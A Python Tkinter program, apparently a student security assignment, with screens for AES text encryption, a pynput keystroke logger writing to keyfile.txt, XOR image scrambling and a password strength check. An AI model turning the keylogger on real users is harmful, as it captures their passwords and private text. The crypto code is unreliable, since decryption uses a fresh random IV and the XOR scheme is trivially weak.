from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode
from pynput import keyboard
import tkinter as tk
from tkinter import  filedialog
class imageEncrption:
    def __init__(self,master):
        self.master = master
        self.master.title("Image Encryption")
        self.master.geometry("200x160")

        b1=tk.Button(master,text="load image",command=self.encriptImage)
        b1.place(x=70,y=10)
        self.entry1=tk.Text(master,height=1,width=10)
        self.entry1.place(x=50,y=50)

    def encriptImage(self):
        file1=filedialog.askopenfile(mode='r',filetype=[('jpg file','*.jpg'),('png file','*.png')])
        if file1 is not None:
            fileName=file1.name
            key=self.entry1.get(1.0,tk.END)
            print(key)
            f1=open(fileName,'rb')
            image=f1.read()
            f1.close()
            image=bytearray(image)
            for index,value in enumerate(image):
                image[index]=value^int(key)
            fi1=open(fileName,'wb')
            fi1.write(image)
            fi1.close()


class keyLogger:
    def __init__(self,master):
        self.master = master
        self.master.title("KeyLogger")
        self.master.geometry("400x300")
        label = tk.Label(self.master, text="KeyLogger is Active")
        label.pack()
        self.decrypt_button = tk.Button(master, text="Decrypt", command=self.start)
        self.decrypt_button.pack()
    def start(self):
        listener = keyboard.Listener(on_press=self.keyPressed)
        listener.start()
        input()
    def keyPressed(self,key):
        print(str(key))
        with open("keyfile.txt", 'a') as logKey:
            try:
                char = key.char
                logKey.write(char + " ")
            except:
                print("Error getting char")


class EncryptionGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("AES Text Encryption/Decryption")
        self.master.geometry("400x300")

        self.text_input = tk.Text(master, height=10, width=40)
        self.text_input.pack()

        self.key_label = tk.Label(master, text="Enter Key (16, 24, or 32 bytes):")
        self.key_label.pack()

        self.key_entry = tk.Entry(master)
        self.key_entry.pack()

        self.encrypt_button = tk.Button(master, text="Encrypt", command=self.show_encrypted_screen)
        self.encrypt_button.pack()

        self.decrypt_button = tk.Button(master, text="Decrypt", command=self.show_decrypted_screen)
        self.decrypt_button.pack()

    def show_encrypted_screen(self):
        encrypted_text = self.encrypt_text()
        self.show_output_screen("Encrypted Text", encrypted_text)

    def show_decrypted_screen(self):
        decrypted_text = self.decrypt_text()
        if decrypted_text is not None:
            self.show_output_screen("Decrypted Text", decrypted_text)
        else:
            self.show_output_screen("Decrypted Text",  "Decryption failed. Incorrect key or padding.")

    def encrypt_text(self):
        text = self.text_input.get("1.0", tk.END).strip()
        key = self.adjust_key_length(self.key_entry.get())
        cipher = AES.new(key, AES.MODE_CBC)
        encrypted_text = cipher.encrypt(pad(text.encode(), AES.block_size))
        encrypted_text = b64encode(encrypted_text).decode()
        return encrypted_text

    def decrypt_text(self):
        text = self.text_input.get("1.0", tk.END).strip()
        key = self.adjust_key_length(self.key_entry.get())
        try:
            cipher = AES.new(key, AES.MODE_CBC)
            decrypted_text = unpad(cipher.decrypt(b64decode(text)), AES.block_size).decode()
            return decrypted_text
        except ValueError:
            return None

    def adjust_key_length(self, key):
        if len(key) < 16:
            key = key.ljust(16, '\0')
        elif len(key) < 24:
            key = key.ljust(24, '\0')
        elif len(key) < 32:
            key = key.ljust(32, '\0')
        elif len(key) > 32:
            key = key[:32]
        return key.encode()

    def show_output_screen(self, title, output_text):
        output_screen = tk.Toplevel(self.master)
        output_screen.title(title)
        output_screen.geometry("400x300")

        output_label = tk.Label(output_screen, text=output_text)
        output_label.pack()

        copy_button = tk.Button(output_screen, text="Copy", command=lambda: self.copy_to_clipboard(output_text))
        copy_button.pack()

    def copy_to_clipboard(self, text):
        self.master.clipboard_clear()
        self.master.clipboard_append(text)
        self.master.update()  # now it stays on the clipboard after the window is closed


class PasswordAnalyzer:
    def __init__(self, master):
        self.master = master
        self.master.title("Password Analyzer")
        self.master.geometry("400x300")

        self.password_label = tk.Label(master, text="Enter Password:")
        self.password_label.pack()

        self.password_entry = tk.Entry(master)
        self.password_entry.pack()

        self.analyze_button = tk.Button(master, text="Analyze", command=self.analyze_password)
        self.analyze_button.pack()

        self.result_label = tk.Label(master, text="")
        self.result_label.pack()

    def analyze_password(self):
        password = self.password_entry.get()

        length_ok = len(password) >= 8
        uppercase_ok = any(char.isupper() for char in password)
        lowercase_ok = any(char.islower() for char in password)
        digit_ok = any(char.isdigit() for char in password)
        special_ok = any(not char.isalnum() for char in password)

        strength = "Weak"
        if length_ok and uppercase_ok and lowercase_ok and digit_ok and special_ok:
            strength = "Strong"
        elif length_ok and (uppercase_ok or lowercase_ok or digit_ok or special_ok):
            strength = "Moderate"

        result_text = f"Strength: {strength}"
        self.result_label.config(text=result_text)




class mainScreen:
    def __init__(self, master):
        self.master = master
        self.master.title("Assignment")
        self.master.geometry("800x600")
        label = tk.Label(self.master, text="Home Screen")
        label.pack()
        # Create buttons
        self.button1 = tk.Button(self.master, text="Text Encryption", command=self.screen1, width=100, height=6)
        self.button1.place(relx=0.05, rely=0.2, anchor=tk.W)

        self.button2 = tk.Button(self.master, text="Key Logger Software", command=self.screen2, width=100, height=6)
        self.button2.place(relx=0.05, rely=0.35, anchor=tk.W)

        self.button3 = tk.Button(self.master, text="Image Encryption", command=self.screen3, width=100, height=6)
        self.button3.place(relx=0.05, rely=0.5, anchor=tk.W)

        self.button4 = tk.Button(self.master, text="Password Analyzer", command=self.screen4, width=100, height=6)
        self.button4.place(relx=0.05, rely=0.65, anchor=tk.W)

    def home(self):
        self.clear_screen()
        label = tk.Label(self.master, text="Home Screen")
        label.pack()
        self.button1 = tk.Button(self.master, text="Text Encryption", command=self.screen1, width=100, height=6)
        self.button1.place(relx=0.05, rely=0.2, anchor=tk.W)

        self.button2 = tk.Button(self.master, text="Key Logger Software", command=self.screen2, width=100, height=6)
        self.button2.place(relx=0.05, rely=0.35, anchor=tk.W)

        self.button3 = tk.Button(self.master, text="Image Encryption", command=self.screen3, width=100, height=6)
        self.button3.place(relx=0.05, rely=0.5, anchor=tk.W)

        self.button4 = tk.Button(self.master, text="Password Analyzer", command=self.screen4, width=100, height=6)
        self.button4.place(relx=0.05, rely=0.65, anchor=tk.W)
    def screen1(self):
        self.master.destroy()  # Close current GUI
        root1 = tk.Tk()  # Create new Tkinter instance for first GUI
        EncryptionGUI(root1)
    def screen2(self):
        self.master.destroy()  # Close current GUI
        root1 = tk.Tk()  # Create new Tkinter instance for first GUI
        keyLogger(root1)
    def screen3(self):
        self.master.destroy()  # Close current GUI
        root1 = tk.Tk()  # Create new Tkinter instance for first GUI
        imageEncrption(root1)
    def screen4(self):
        self.master.destroy()  # Close current GUI
        root1 = tk.Tk()  # Create new Tkinter instance for first GUI
        PasswordAnalyzer(root1)
    def clear_screen(self):
        for widget in self.master.winfo_children():
            widget.destroy()

def main():
    root = tk.Tk()
    gui = mainScreen(root)
    root.mainloop()

if __name__ == "__main__":
    main()

# Press the green button in the gutter to run the script.


# See PyCharm help at https://www.jetbrains.com/help/pycharm/
